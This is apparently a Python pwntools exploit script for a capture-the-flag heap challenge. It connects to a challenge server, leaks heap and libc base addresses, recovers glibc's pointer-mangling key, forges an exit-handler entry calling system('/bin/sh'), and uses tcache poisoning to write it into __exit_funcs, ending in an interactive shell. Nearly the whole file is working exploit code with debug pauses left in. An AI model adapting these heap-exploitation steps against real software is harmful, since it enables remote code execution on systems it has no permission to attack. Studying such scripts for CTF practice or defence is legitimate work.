#!/bin/python
from pwn import remote, process, ELF,context, p64, u64, log
from pwnlib import gdb
import string
import sys

context.terminal="/bin/kitty"

target=ELF("./main")
libc=ELF("target_libc.so.6")
CN=None
#CN = remote("172.17.0.2", 1024)
CN = remote("67efb32cde276d44ece0a4d4-intro-heap-3.challenge.master.cscg.live", 31337, ssl=True)
p=target.process()
if isinstance(p, process) and CN is None:
    print("isproces")
    CN=p
elif CN is None:
    sys.exit()

PROMPT=b"choice?"

def createTask(name):
    if isinstance(name,str):
        contentmsg=name.encode('ascii')
    elif isinstance(name, bytes):
        contentmsg=name
    else:
        contentmsg=None
        print("Wrong content type")
    if contentmsg is not None:
        CN.send(b"1\n")
        CN.send(contentmsg+b"\n")
    else:
        print("wrong type boii")
    CN.recvuntil(PROMPT)
    #print(response)

def deleteTask(mainTaskId:int):
    CN.send(b"2\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    CN.recvuntil(PROMPT)

def listTask():
    CN.send(b"3\n")
    response=CN.recvuntil(PROMPT)
    r1=response.split(b"---menu---")[0].split(b"\n")
    tasks={}
    for i in range(len(r1)-1):
        pair=r1[i].split(b"] ")
        tasks[int(pair[0][-2:])]=pair[1]
        #tasks.append(r1[i].split(b"] ")[1])
    #print(tasks)
    return tasks

def createSubTask(content, mainTaskId:int, length=None):
    if length==None:
        length=len(content)+1
    CN.send(b"4\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    CN.send(str(length).encode('ascii')+b"\n")
    if isinstance(content,str):
        contentmsg=content.encode('ascii')
    elif isinstance(content, bytes):
        contentmsg=content
    else:
        contentmsg=None
        print("Wrong content type")
    if contentmsg is not None:
        if length!=0:
            CN.send(contentmsg+b"\n")
    CN.recvuntil(PROMPT)



def deleteSubTask(mainTaskId:int, subTaskId:int):
    CN.send(b"5\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    CN.send(str(subTaskId).encode('ascii')+b"\n")
    CN.recvuntil(PROMPT)

def listSubTask(mainTaskId:int)->dict[int, bytes]:
    CN.send(b"6\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    response = CN.recvuntil(PROMPT)
    r1=response.split(b"---menu---")[0].split(b"\n")
    tasks={}
    for i in range(len(r1)-1):
        pair=r1[i].split(b"] ")
        tasks[int(pair[0][-2:])]=pair[1]
        # tasks.append(r1[i].split(b"] ")[1])
    #print(tasks)
    return tasks

def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))


rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def main():
    #pid=int(input("Enter pid: ").strip())
    #g=gdb.attach(p)
    CN.recvuntil(PROMPT)
    charset=string.ascii_lowercase

    #fill data space before
    for i in range(6):
        createSubTask(charset[i]*3,-11)
        
    
    #leak Heapaddr
    createSubTask("",-11,255)
    createSubTask("",-11,0)
    createSubTask("",0,0)
    createSubTask("",0,0)
    createSubTask("",0,0)
    createSubTask("",0,0)
    createSubTask("",1,0)
    createSubTask("",1,0)
    createSubTask("",1,0)
    createSubTask("",1,0)
    r=listSubTask(0)
    heapBaseAddress=int(r[0][::-1].hex(),16)-0x550
    log.info(f"Heap Base {hex(heapBaseAddress)}")
    
    #leak libcaddr - 2
    createTask("libcsParent")
    for i in range(10):
        createSubTask(str(i)*0x90,2)
    for i in range(8):
        deleteSubTask(2,i)

    #task - 3
    createSubTask(b"\x00"*8+(heapBaseAddress+0xb40).to_bytes(8,'little')+b"\x00"*8*23,-11,255)
    r=listSubTask(3)
    libcBaseAddress=int(r[0][::-1].hex(),16)-0x219D80#0x1F1D80#-
    libc.address=libcBaseAddress
    log.info(f"Libcbase address: {hex(libcBaseAddress)}")


    #replace exit with system

    # calculate function addresses
    orig_onexit_addr = libcBaseAddress + 0x21af18 # not entirely shure
    __exit_funcs = libcBaseAddress + 0x219838
    orig_handler = libcBaseAddress + 0x232040  # And this is the address of the function (_dl_fini) it calls
    systemAddress=libc.sym['system']
    
    # Addresses we need to double free later, we are at 0x1b50 - 4
    createSubTask(b"Nameofse"
                  + p64(heapBaseAddress+0x15F0) # first wrapper (a)
                  + p64(heapBaseAddress+0x1650) # second wrapper (b)
                  + p64(heapBaseAddress+0x1600) # first inner (a)
                  + p64(heapBaseAddress+0x1660) # second inner (b)
                  ,-11, 255) 

    # prepare binsh - 5
    createTask("/bin/sh")
    binshOffset=0xf70

    # leak old scrambled function from exit hook - 6
    log.info(f'Old hooked function is at {hex(orig_onexit_addr)}')
    createSubTask(b"\x00"*8+(orig_onexit_addr-8).to_bytes(8,'little')+b"\x00"*8*23,-11,255)
    r=listSubTask(6)
    contentOfOrig=int(r[0][::-1].hex(),16)
    log.info(f'old scrambled function from exit hook: {hex(contentOfOrig)}')

    
    # calculate scramble key
    key = ror(contentOfOrig, 0x11, 64) ^ orig_handler

    log.info(f'ptr encryption key: {hex(key)}')
    log.info(f'sanity check: {hex(u64(encrypt(orig_handler, key)))}')

    scrabledSystem=encrypt(libc.sym['system'], key)
    log.info(f"scrambled System: {hex(int.from_bytes(scrabledSystem,'little'))}\n binsh: {hex(heapBaseAddress+binshOffset)}")
    log.info(f"unscrambled System: {hex(systemAddress)}")

    # overwrite exit hook
    # make heap clean again!
    #input("t")
    for i in range(20):
        createSubTask(b"",2,1)
    deleteSubTask(3,0)
    for i in range(20):
        createSubTask(b"",0,1)

    # We already allocated the '/bin/sh' at offset 0x2c0
    #############  next | count  | type (cxa) | addr                             | arg               | not used
    onexit_fun = p64(0) + p64(1) + p64(4)     + encrypt(libc.sym['system'], key) + p64(heapBaseAddress+binshOffset) + p64(0)
    createSubTask(onexit_fun,-11)

    # simple tcache poisonining
    target=__exit_funcs-8
    print(f"The address we want malloc() to return is {hex(target)}.")
    print("Allocating 2 (wrapped) buffers.")
    createSubTask(p64(0x21)+p64(0x4141)+p64(0x22)+p64(0x33)+p64(0x21),-11,0x4c)# 8
    createSubTask(p64(0x21)+p64(0x4242)+p64(0x22)+p64(0x33)+p64(0x21),-11,0x4c)# 9

    print("Freeing the buffers...")
    input("waitfree")
    deleteSubTask(4,2) # inner a
    deleteSubTask(4,3) # inner b

    print("Now the tcache list has [ b -> a ].")
    deleteTask(9)
    createSubTask(p64(0x21)+p64(target ^ (heapBaseAddress+0x1660)>>12)+p64(0x22)+p64(0x33)+p64(0x21),-11,0x4c)# 9
    #createSubTask(p64(0x21)+p64(target)+p64(0x22)+p64(0x33)+p64(0x21),-11,0x4c)# 9

    print("Now the tcache list has [ b -> target ].")
    input("did it work?")
    createSubTask(b"",-11,0x10)
    createSubTask((heapBaseAddress+0x15A8).to_bytes(8,'little')+b"\x00",-11,0x10)

    CN.interactive()
    #Now, chunk %p will be freed into tcache list
    input("break6")
    createSubTask(b"test",1,254)
    # Size is not matched with tcache list, so get chunk from unsortedbin, which makes chunk overlap
    input("break7")
    createSubTask(b"\x00"*55+b"AAAA",0)

    #Now, you can control tcache list to alloc arbitrary address\
    createSubTask("",3,200)

    createTask(b"\xde\xad\xbe\xef")
    CN.interactive()
    #CN.send(b"0\n")



if __name__=="__main__":
    main()
    CN.close()